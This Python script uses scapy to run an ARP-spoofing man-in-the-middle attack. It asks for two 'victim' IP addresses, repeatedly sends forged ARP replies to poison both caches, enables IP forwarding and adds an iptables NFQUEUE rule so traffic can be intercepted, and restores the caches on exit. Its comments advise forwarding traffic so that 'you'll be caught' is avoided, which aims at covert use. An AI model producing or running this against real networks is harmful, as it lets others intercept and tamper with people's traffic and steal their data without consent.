from scapy.all import ARP, Ether, srp, send
import time
import sys
import os

#Note: If running on a Linux machine, enable port forwarding with this command: sudo sysctl -w net.ipv4.ip_forward=1
#If you don't, the targets will lose internet connection and you'll be caught
#Use this command to undo it, but it may not be necessary since it shouldn't persist after a reboot: sudo sysctl -w net.ipv4.ip_forward=0

def get_mac(ip):
    #make an Ethernet broadcast frame
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    #make an ARp request packet
    arp_request = ARP(pdst=ip)
    #Combine the two
    packet = broadcast / arp_request
    #send & receive
    answered_list = srp(packet, timeout=2, verbose=False)[0]

    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        print(f"[!] Critical Error: Could not find the MAC for {ip}. Is the target up?")
        sys.exit()


def spoof(target_ip, host_ip):
    #Get the MAC address of the computer we're trying to spoof
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"[-] Could not find MAC for {target_ip}")
        return
    #create the lie (fake packet); op=2 means it is an ARP "is-at" response
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=host_ip)
    #send the lie
    send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)

    #send the real MAC associated with the real IP
    packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac )
    send(packet, count=4, verbose=False)


#Main execution loop

#sets up IP forwarding and configures IP tables so you don't have to
os.system("sysctl -w net.ipv4.ip_forward=1")
os.system("iptables -I FORWARD -j NFQUEUE --queue-num 1")

victim1_ip = input("Enter the IP address of your first target.")  #Victim #1's IP goes here
victim2_ip = input("Enter the IP address of your second target.") # Victim #2's IP goes here

try:
    sent_packets_count = 0
    print("[+] Starting Spoof.... Press Ctrl + C to stop.")
    while True:
        #tell the target that you are the gateway
        spoof(victim1_ip, victim2_ip)
        #tell the gateway that you are the target
        spoof(victim2_ip, victim1_ip)
        sent_packets_count += 2
        print(f"\r[+] Packets sent: {sent_packets_count}", end="")
        sys.stdout.flush()
        time.sleep(2) #we wait to avoid flooding the network
except KeyboardInterrupt:
    print("\n [!] Detected Ctrl+C...Restoring network, please wait.")
    restore(victim1_ip, victim2_ip)
    restore(victim2_ip, victim1_ip)
    print("[+] Network restored. Exiting.")


        
